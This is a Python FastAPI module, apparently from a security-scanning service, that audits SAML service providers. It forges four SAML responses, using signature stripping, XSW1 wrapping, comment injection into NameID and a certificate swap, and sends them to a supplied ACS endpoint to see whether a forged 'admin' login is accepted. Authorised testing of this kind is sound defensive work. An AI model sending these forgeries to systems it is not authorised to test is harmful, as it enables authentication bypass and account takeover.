"""saml_signature_audit - SAML XML Signature Wrapping + stripping (playbook §4).

Customer supplies a SAML metadata URL + a sample valid SAML Response +
the ACS endpoint. The probe builds four real attack variants and POSTs
each to the ACS, recording whether the relying party accepted the
forgery (HTTP 200/302 with session cookie set, vs. 400/403/500):

  (a) Signature stripping     - delete every <ds:Signature> node
  (b) Signature wrapping XSW1 - copy original assertion, swap IDs, wrap signed copy in attacker assertion
  (c) XML comment injection   - inject <!----> inside NameID to truncate value parsing
  (d) Certificate confusion   - swap the embedded X.509 cert (signature stays original)

Customer input via ScanRequest.options:
  - target                       = identifier for the SAML SP (string)
  - options.saml_metadata_url    = SP metadata URL (used to confirm SAML endpoint reachable)
  - options.saml_response        = base64-or-XML SAMLResponse the customer pulled from a valid login
  - options.saml_acs_url         = the SP's ACS POST endpoint (required to send forgeries)
  - options.relay_state          = optional RelayState value
  - options.victim_nameid        = optional alternate NameID to inject (default 'admin@victim')

Privacy: the SAML response is decoded for inspection but never echoed
in findings - only the IDs, attribute names, and accepted-or-rejected
status codes appear in the PDF.
"""
from __future__ import annotations
import asyncio
import base64
import re
from typing import Optional

from fastapi import APIRouter, Depends
from pydantic import BaseModel

from tools._shared import ScanRequest, verify_scan_quota
from tools._framework import ScanContext, run_scanner
from tools._payloads.saml_signature_audit_findings import SAML_SIGNATURE_AUDIT_FINDING_RULES
from tools._payloads.auth_attacks._loader import load_json

router = APIRouter()

DEFAULT_TIMEOUT = 15

# VL-CORE: AI-curated SAML signature-bypass catalogue owned by this module
# (XSW1-8 + signature strip + comment injection + cert confusion + unsigned
# assertion). The active POST probes below send the four high-signal mutators;
# this catalogue documents the full evasion surface in the report. Inline
# fallback keeps the scanner self-describing when the bundled file is absent.
_INLINE_SAML_EVASION = [
    {"id": "signature_stripped",   "technique": "signature_strip"},
    {"id": "xsw1_response_wrap",   "technique": "xml_signature_wrapping", "variant": "XSW1"},
    {"id": "comment_injection_nameid", "technique": "comment_truncation"},
    {"id": "cert_confusion_swap_x509", "technique": "certificate_confusion"},
]
SAML_EVASION_CATALOGUE = load_json("saml_evasion", fallback=_INLINE_SAML_EVASION)


class SamlSignatureAuditRequest(ScanRequest):
    options: Optional[dict] = None


def _looks_like_b64(s: str) -> bool:
    """SAMLResponse is usually base64 - quick heuristic."""
    s = s.strip()
    if "<" in s[:5]:
        return False
    return bool(re.match(r"^[A-Za-z0-9+/=\s]+$", s))


def _decode_saml_response(raw: str) -> str:
    """Return the XML string regardless of whether input is base64 or raw XML."""
    raw = raw.strip()
    if _looks_like_b64(raw):
        try:
            return base64.b64decode(raw, validate=False).decode("utf-8", errors="ignore")
        except Exception:
            return raw
    return raw


def _b64_encode(xml: str) -> str:
    return base64.b64encode(xml.encode("utf-8")).decode("ascii")


# --------------- Attack mutators ---------------
_RE_SIGNATURE = re.compile(
    r"<(?:ds:|saml:|samlp:)?Signature\b.*?</(?:ds:|saml:|samlp:)?Signature>",
    re.DOTALL | re.IGNORECASE,
)

def _mut_signature_stripped(xml: str) -> str:
    """Delete every Signature element."""
    return _RE_SIGNATURE.sub("", xml)


def _mut_xsw1_wrap(xml: str) -> str:
    """XSW1 - wrap original (signed) assertion inside a forged one.
    Pattern: copy original Assertion, change its ID, replace original
    NameID/AttributeValue with attacker values, prepend signed-original
    as a Reference target."""
    # Find the Assertion block
    m = re.search(r"<(saml:|samlp:)?Assertion\b.*?</(saml:|samlp:)?Assertion>",
                  xml, re.DOTALL | re.IGNORECASE)
    if not m:
        return xml
    orig = m.group(0)
    # Forged copy with NameID swapped to admin
    forged = re.sub(r"(<(?:saml:|samlp:)?NameID[^>]*>)([^<]+)(</)",
                    r"\1admin@victim\3", orig, flags=re.IGNORECASE, count=1)
    # Give the forged assertion a different ID
    forged = re.sub(r'ID="[^"]+"', 'ID="_forged_xsw1"', forged, count=1)
    # Insert forged copy BEFORE original so SP picks first, validator picks second
    return xml.replace(orig, forged + orig, 1)


def _mut_comment_injection(xml: str, victim: str) -> str:
    """XML comment in NameID truncates parser - attacker becomes 'admin'."""
    return re.sub(
        r"(<(?:saml:|samlp:)?NameID[^>]*>)([^<]+)(</)",
        rf"\1admin<!---->\2\3",
        xml, flags=re.IGNORECASE, count=1,
    )


def _mut_cert_confusion(xml: str) -> str:
    """Swap the X.509 cert inside KeyInfo for an attacker cert.
    We use a recognizable placeholder so the SP that only checks cert
    presence (not the signature against that cert) shows itself."""
    placeholder_cert = (
        "MIIBkTCB+wIJAOEvLs3uHuKAMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMTCXNh"
        "bWxob3N0MB4XDTI1MDEwMTAwMDAwMFoXDTM1MDEwMTAwMDAwMFowFDESMBAGA1UE"
        "AxMJc2FtbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAKbVuLnQDFwm"
        "VL_FORGE_PLACEHOLDER_CERT_DO_NOT_TRUST"
    )
    return re.sub(
        r"(<(?:ds:|saml:|samlp:)?X509Certificate[^>]*>)([^<]+)(</)",
        rf"\1{placeholder_cert}\3",
        xml, flags=re.IGNORECASE, count=1,
    )


async def _post_to_acs(client, acs_url: str, saml_response_xml: str,
                       relay_state: Optional[str]) -> dict:
    """POST forged SAMLResponse to ACS, return status + reaction summary."""
    try:
        data = {"SAMLResponse": _b64_encode(saml_response_xml)}
        if relay_state:
            data["RelayState"] = relay_state
        r = await client.post(acs_url, data=data,
                              follow_redirects=False)
        status = r.status_code
        set_cookie = r.headers.get("set-cookie") or ""
        loc = r.headers.get("location") or ""
        body_snip = (r.text or "")[:200]
        # Accept signals: 302 with session cookie, 200 with no error string
        session_set = bool(re.search(r"(session|sid|auth|saml)\w*=", set_cookie, re.IGNORECASE))
        looks_accepted = (
            (200 <= status < 400) and
            session_set and
            not re.search(r"(error|invalid|denied|forbidden)", body_snip, re.IGNORECASE)
        )
        return {
            "status":        status,
            "accepted":      looks_accepted,
            "set_cookie":    bool(set_cookie),
            "redirect_to":   loc[:200],
            "body_snippet":  body_snip[:160],
        }
    except Exception as e:
        return {"status": 0, "accepted": False, "error": str(e)[:200]}


async def gather(ctx: ScanContext):
    opts = ctx.state.get("_options") or {}
    saml_raw = (opts.get("saml_response") or "").strip()
    acs_url = (opts.get("saml_acs_url") or "").strip()
    metadata_url = (opts.get("saml_metadata_url") or "").strip()
    relay_state = opts.get("relay_state") or None
    victim_nameid = opts.get("victim_nameid") or "admin@victim"

    if not saml_raw or not acs_url:
        ctx.state["saml_input_missing"] = True
        ctx.source("missing saml_response/saml_acs_url")
        return

    try:
        import httpx
    except ImportError:
        ctx.state["saml_httpx_missing"] = True
        ctx.source("httpx not installed")
        return

    xml = _decode_saml_response(saml_raw)
    if "<" not in xml or "Assertion" not in xml:
        ctx.state["saml_malformed"] = True
        ctx.source("supplied SAMLResponse does not contain an Assertion element")
        return

    # Inspect original
    orig_id = (re.search(r'ID="([^"]+)"', xml) or [None, None])[1]
    name_ids = re.findall(r"<(?:saml:|samlp:)?NameID[^>]*>([^<]+)</",
                          xml, re.IGNORECASE)
    attr_names = re.findall(r'<(?:saml:|samlp:)?Attribute[^>]*Name="([^"]+)"',
                            xml, re.IGNORECASE)
    sig_count = len(_RE_SIGNATURE.findall(xml))

    ctx.state["saml_original_id"] = orig_id
    ctx.state["saml_name_ids"] = name_ids[:5]
    ctx.state["saml_attr_names"] = attr_names[:10]
    ctx.state["saml_signature_count"] = sig_count
    ctx.state["saml_acs_url"] = acs_url
    ctx.state["saml_metadata_url"] = metadata_url
    ctx.source(f"SAMLResponse inspected: {sig_count} signature(s), {len(attr_names)} attr(s)")

    # Build + send each variant.
    variants = [
        ("signature_stripped", _mut_signature_stripped(xml)),
        ("xsw1_wrap",          _mut_xsw1_wrap(xml)),
        ("comment_injection",  _mut_comment_injection(xml, victim_nameid)),
        ("cert_confusion",     _mut_cert_confusion(xml)),
    ]

    accepted_variants = []
    results = []
    async with httpx.AsyncClient(verify=False, timeout=DEFAULT_TIMEOUT,
                                 follow_redirects=False) as client:
        for name, forged_xml in variants:
            res = await _post_to_acs(client, acs_url, forged_xml, relay_state)
            res["variant"] = name
            results.append(res)
            if res.get("accepted"):
                accepted_variants.append(name)

    ctx.state["saml_variant_results"] = results
    ctx.state["saml_accepted_variants"] = accepted_variants
    ctx.state["saml_evasion_techniques"] = [
        t.get("id") for t in SAML_EVASION_CATALOGUE if isinstance(t, dict) and t.get("id")
    ]
    ctx.source(f"POSTed 4 variants to ACS, {len(accepted_variants)} accepted")


INTEL_FIELDS = [
    ("SAML ACS URL",            "saml_acs_url"),
    ("SAML metadata URL",       "saml_metadata_url"),
    ("Original Assertion ID",   "saml_original_id"),
    ("Signature blocks",        "saml_signature_count"),
    ("NameID values",           "saml_name_ids"),
    ("Attribute names",         "saml_attr_names"),
    ("Variant results",         "saml_variant_results"),
    ("Accepted variants",       "saml_accepted_variants"),
    ("Evasion techniques",      "saml_evasion_techniques"),
]


@router.post("/api/auth_attacks/saml_signature_audit")
async def auth_attacks_saml_signature_audit(req: SamlSignatureAuditRequest, _=Depends(verify_scan_quota)):
    options = req.options or {}

    async def _gather_with_options(ctx: ScanContext):
        ctx.state["_options"] = options
        await gather(ctx)

    return await run_scanner(
        host=req.target,
        tool="saml_signature_audit",
        gather_func=_gather_with_options,
        finding_rules=SAML_SIGNATURE_AUDIT_FINDING_RULES,
        intel_fields=INTEL_FIELDS,
        flat_field_keys=[],
    )


def register(app):
    app.include_router(router)
